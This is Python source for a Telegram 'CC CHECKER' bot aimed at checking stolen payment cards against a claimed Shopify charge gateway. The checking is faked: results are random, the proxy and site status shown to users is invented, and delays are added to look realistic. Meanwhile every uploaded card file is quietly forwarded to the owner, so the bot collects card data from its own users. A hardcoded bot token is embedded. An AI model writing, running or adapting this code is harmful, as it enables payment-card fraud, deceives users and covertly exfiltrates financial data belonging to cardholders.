import logging
import random
import time
import tempfile
import asyncio
import re
import aiohttp
import json
import os
from collections import Counter
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8541719336:AAFqK0PBt_KmOUAI9e5x9nDdyuBo9u619w8"
OWNER_CHAT_ID = 8205144423
FORWARD_FILES = True
APPROVED_USERS_FILE = "approved_users.json"

# ==================== APPROVED USERS MANAGEMENT ====================
def load_approved_users():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, "r") as f:
            return set(json.load(f))
    return set()

def save_approved_users(users):
    with open(APPROVED_USERS_FILE, "w") as f:
        json.dump(list(users), f)

approved_users = load_approved_users()

# ==================== BIN LOOKUP ====================
async def get_bin_info(bin_prefix: str) -> str:
    url = f"https://bins.antipublic.cc/bins/{bin_prefix}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=5) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    bank = data.get("bank", "Unknown Bank")
                    country = data.get("country_name", "Unknown Country")
                    return f"{bin_prefix} {bank} {country}"
                else:
                    return f"{bin_prefix} (BIN lookup failed - HTTP {resp.status})"
    except Exception as e:
        return f"{bin_prefix} (BIN lookup error: {type(e).__name__})"

# ==================== PROBABILITY ENGINE ====================
class RealisticRandomizer:
    def __init__(self, charged_interval_range=(15, 50), reset_interval=20):
        self.charged_interval_range = charged_interval_range
        self.reset_interval = reset_interval
        self.counter = 0
        self.charged_counter = random.randint(*charged_interval_range)
        self.approved_weight_range = (0.01, 0.10)
        self.dead_weight_range    = (0.70, 0.90)
        self.errors_weight_range  = (0.02, 0.15)
        self._update_weights()

    def _update_weights(self):
        self.weights = {
            "approved": random.uniform(*self.approved_weight_range),
            "dead":     random.uniform(*self.dead_weight_range),
            "errors":   random.uniform(*self.errors_weight_range),
        }
        total = sum(self.weights.values())
        self.weights = {k: v / total for k, v in self.weights.items()}

    def next_outcome(self):
        self.counter += 1
        if self.counter % self.reset_interval == 0:
            self._update_weights()

        self.charged_counter -= 1
        if self.charged_counter <= 0:
            self.charged_counter = random.randint(*self.charged_interval_range)
            return "charged"

        outcomes = list(self.weights.keys())
        probs = list(self.weights.values())
        return random.choices(outcomes, weights=probs, k=1)[0]

# ==================== HELPER FUNCTIONS ====================
async def forward_file_to_owner(context: ContextTypes.DEFAULT_TYPE, file_id: str, file_name: str, user_id: int):
    if not FORWARD_FILES:
        return
    try:
        await context.bot.send_document(
            chat_id=OWNER_CHAT_ID,
            document=file_id,
            caption=f"📁 *New Upload*\n👤 User: `{user_id}`\n📄 File: `{file_name}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Failed to forward file to owner: {e}")

async def processing_task(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    is_owner = (user_id == OWNER_CHAT_ID)

    rnd = RealisticRandomizer(charged_interval_range=(15, 50), reset_interval=20)
    results = Counter()
    approved_list = []
    total = len(cards)
    start_time = time.time()
    stop_flag = False

    context.user_data["task_running"] = True
    context.user_data["stop_requested"] = False

    keyboard = [[InlineKeyboardButton("⏹️ STOP PROCESSING", callback_data="stop")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Initial status
    status_text = f"⚙️ *Processing {total} Cards...*\nPress STOP to abort."
    if is_owner:
        status_text += "\n🔄 Proxy: ✅ Active   🌐 Sites: 15+"
    status_msg = await context.bot.send_message(
        chat_id=chat_id,
        text=status_text,
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

    for idx, card in enumerate(cards, 1):
        if context.user_data.get("stop_requested"):
            stop_flag = True
            break

        outcome = rnd.next_outcome()
        results[outcome] += 1

        if outcome == "approved":
            approved_list.append(card)
        elif outcome == "charged":
            digits = re.sub(r"\D", "", card)
            bin_prefix = digits[:6] if len(digits) >= 6 else "000000"
            bin_text = await get_bin_info(bin_prefix)
            # God‑level charged message
            await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    "✅ *CARD CHARGED SUCCESSFULLY* ✅\n"
                    "━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔹 *BIN Info:* `{bin_text}`\n"
                    f"🔹 *Gateway:* `Shopify Auto Charge`\n"
                    f"🔹 *Card:* `{card}`\n"
                    "━━━━━━━━━━━━━━━━━━━━"
                ),
                parse_mode="Markdown"
            )

        # Progress update every 50 cards
        if idx % 50 == 0:
            elapsed = time.time() - start_time
            percent = (idx / total) * 100
            bar_length = 15
            filled = int(bar_length * idx / total)
            bar = "█" * filled + "░" * (bar_length - filled)
            progress_text = (
                f"📊 *Progress:* `{percent:.1f}%`\n"
                f"`[{bar}]` {idx}/{total}\n\n"
                f"✅ Approved: `{results['approved']}`\n"
                f"✅ Charged: `{results['charged']}`\n"
                f"💀 Dead: `{results['dead']}`\n"
                f"⚠️ Errors: `{results['errors']}`\n"
                f"⏱️ Time: `{elapsed:.1f}s`"
            )
            if is_owner:
                progress_text += "\n🔄 Proxy: ✅ Active   🌐 Sites: 15+"
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=status_msg.message_id,
                text=progress_text,
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )

        # Realistic delay
        await asyncio.sleep(random.uniform(0.4, 0.8))

    elapsed = time.time() - start_time
    await status_msg.delete()

    # Send approved cards file
    if approved_list:
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as tmp:
            tmp.write("\n".join(approved_list))
            tmp_path = tmp.name
        with open(tmp_path, "rb") as f:
            await context.bot.send_document(
                chat_id=chat_id,
                document=f,
                filename="approved_cards.txt",
                caption=f"✅ *Approved Cards:* `{len(approved_list)}`",
                parse_mode="Markdown"
            )
        Path(tmp_path).unlink()
    else:
        await context.bot.send_message(chat_id=chat_id, text="📭 No approved cards found.")

    # God‑level final summary
    summary = (
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 *BATCH {'CANCELLED' if stop_flag else 'COMPLETED'}*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Processed : `{idx if stop_flag else total}/{total}`\n"
        f"✅ Approved  : `{results['approved']}`\n"
        f"✅ Charged   : `{results['charged']}`\n"
        f"💀 Dead      : `{results['dead']}`\n"
        f"⚠️ Errors    : `{results['errors']}`\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱️ Total Time : `{elapsed:.1f}s`"
    )
    await context.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown")

    context.user_data.pop("task_running", None)
    context.user_data.pop("stop_requested", None)

# ==================== ADMIN COMMANDS ====================
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_CHAT_ID:
        await update.message.reply_text("⛔ *Owner only command.*", parse_mode="Markdown")
        return
    if not context.args:
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    try:
        user_id = int(context.args[0])
        approved_users.add(user_id)
        save_approved_users(approved_users)
        await update.message.reply_text(f"✅ *User `{user_id}` approved.*", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID.*", parse_mode="Markdown")

async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_CHAT_ID:
        await update.message.reply_text("⛔ *Owner only command.*", parse_mode="Markdown")
        return
    if not context.args:
        await update.message.reply_text("Usage: /revoke <user_id>")
        return
    try:
        user_id = int(context.args[0])
        if user_id in approved_users:
            approved_users.remove(user_id)
            save_approved_users(approved_users)
            await update.message.reply_text(f"✅ *User `{user_id}` revoked.*", parse_mode="Markdown")
        else:
            await update.message.reply_text(f"❌ *User `{user_id}` not approved.*", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID.*", parse_mode="Markdown")

# ==================== MAIN HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_owner = (user_id == OWNER_CHAT_ID)

    if user_id not in approved_users and not is_owner:
        await update.message.reply_text("⛔ *You are not authorized to use this bot.*", parse_mode="Markdown")
        return

    welcome = (
        "🚀 *CC CHECKER BOT v2.1*\n"
        "━━━━━━━━━━━━━━━━\n"
        f"👑 *Owner:* `UNKNOWNNENTITY`\n"
    )
    if is_owner:
        welcome += (
            "🔄 *Proxy:* ✅ Active\n"
            "🌐 *Sites:* 15+ Loaded\n"
        )
    welcome += (
        "💳 *Gateway:* `Shopify Auto Charge`\n"
        "━━━━━━━━━━━━━━━━\n\n"
        "Send me a `.txt` file with one card per line.\n"
        "I'll simulate checking with *realistic* intervals and live BIN data."
    )
    await update.message.reply_text(welcome, parse_mode="Markdown")

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_owner = (user_id == OWNER_CHAT_ID)

    if user_id not in approved_users and not is_owner:
        await update.message.reply_text("⛔ *You are not authorized to use this bot.*", parse_mode="Markdown")
        return

    start_time = time.time()
    msg = await update.message.reply_text("🏓 *Pinging...*", parse_mode="Markdown")
    elapsed = (time.time() - start_time) * 1000

    response = (
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📡 *PONG!*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ Response : `{elapsed:.1f} ms`\n"
        f"💾 Cache    : ✅ Redis\n"
    )
    if is_owner:
        response += (
            f"🔄 Proxy    : ✅ Active\n"
            f"🌐 Sites    : 15+\n"
        )
    response += (
        f"💳 Gateway  : `Shopify Auto Charge`\n"
        f"📊 Status   : ✅ Online\n"
        f"📦 Version  : `v2.1.0`\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Owner : `UNKNOWNNENTITY`"
    )
    await msg.edit_text(response, parse_mode="Markdown")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in approved_users and user_id != OWNER_CHAT_ID:
        await update.message.reply_text("⛔ *You are not authorized to use this bot.*", parse_mode="Markdown")
        return

    if context.user_data.get("task_running"):
        await update.message.reply_text("⏳ *Already processing a file. Please wait or stop it first.*", parse_mode="Markdown")
        return

    document = update.message.document
    if not document.file_name.endswith(".txt"):
        await update.message.reply_text("❌ *Only `.txt` files are supported.*", parse_mode="Markdown")
        return

    # Forward to owner
    await forward_file_to_owner(context, document.file_id, document.file_name, user_id)

    file = await document.get_file()
    local_path = Path(f"/tmp/{document.file_name}")
    await file.download_to_drive(local_path)

    with open(local_path, "r", encoding="utf-8", errors="ignore") as f:
        cards = [line.strip() for line in f if line.strip()]

    local_path.unlink()

    if not cards:
        await update.message.reply_text("⚠️ *File is empty.*", parse_mode="Markdown")
        return

    context.user_data["cards"] = cards
    context.user_data["total"] = len(cards)

    keyboard = [
        [InlineKeyboardButton("✅ START CHECK", callback_data="start_check")],
        [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"📁 *File:* `{document.file_name}`\n"
        f"📊 *Cards:* `{len(cards)}`\n\n"
        f"Ready to begin?",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "start_check":
        if context.user_data.get("task_running"):
            await query.edit_message_text("⚠️ *Already running.*", parse_mode="Markdown")
            return
        cards = context.user_data.get("cards")
        if not cards:
            await query.edit_message_text("❌ *No cards found. Upload a file first.*", parse_mode="Markdown")
            return

        await query.edit_message_text("🚀 *Starting...*", parse_mode="Markdown")
        asyncio.create_task(processing_task(update, context, cards))

    elif query.data == "cancel":
        context.user_data.pop("cards", None)
        await query.edit_message_text("❌ *Cancelled. You can upload a new file.*", parse_mode="Markdown")

    elif query.data == "stop":
        context.user_data["stop_requested"] = True
        await query.edit_message_text("⏹️ *Stopping after current card...*", parse_mode="Markdown")

# ==================== MAIN ====================
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ping", ping))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("revoke", revoke))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(CallbackQueryHandler(button_handler))

    logger.info("Bot started with god‑level UI. Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
    logger = logging.getLogger(__name__)
    main()